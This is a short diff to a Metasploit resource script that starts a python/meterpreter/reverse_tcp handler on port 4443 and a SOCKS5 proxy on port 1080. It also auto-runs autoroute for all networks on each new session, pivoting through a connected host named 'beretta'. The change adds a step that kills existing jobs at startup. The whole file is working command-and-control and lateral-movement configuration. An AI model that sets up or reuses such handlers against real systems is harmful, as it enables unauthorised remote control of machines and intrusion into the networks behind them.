@@ -4,7 +4,12 @@
 # Starts a python/meterpreter/reverse_tcp handler on 0.0.0.0:4443
 # and automatically sets up routing + SOCKS proxy when beretta connects.
 
-# ── SOCKS Proxy (start first so it's ready when session arrives) ──
+# ── Clean slate — wait for MSF startup (persistent handlers load
+#    asynchronously and will grab ports before this script runs) ──
+sleep 3
+jobs -K
+
+# ── SOCKS Proxy ──
 use auxiliary/server/socks_proxy
 set SRVPORT 1080
 set VERSION 5
@@ -17,7 +22,7 @@ set LHOST 0.0.0.0
 set LPORT 4443
 set ExitOnSession false
 
-# Auto-run on every new session: add route + verify
+# Auto-run on every new session: add route
 set AutoRunScript multi_console_command -c "run autoroute -s 0.0.0.0/0"
 
 run -j
